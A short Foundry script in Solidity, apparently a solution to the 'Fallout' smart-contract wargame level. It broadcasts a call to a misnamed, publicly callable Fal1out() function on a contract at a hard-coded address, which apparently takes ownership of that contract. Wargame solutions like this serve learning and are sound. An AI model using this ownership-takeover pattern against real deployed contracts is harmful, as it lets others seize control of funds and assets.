// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutScript is Script {
    Fallout public falloutContract = Fallout(payable(0xaD3f8D5E20A323067b3f746F4987b51037fB59e7));

    function run() external {
	vm.startBroadcast();

	falloutContract.Fal1out();

	vm.stopBroadcast();
    }
}
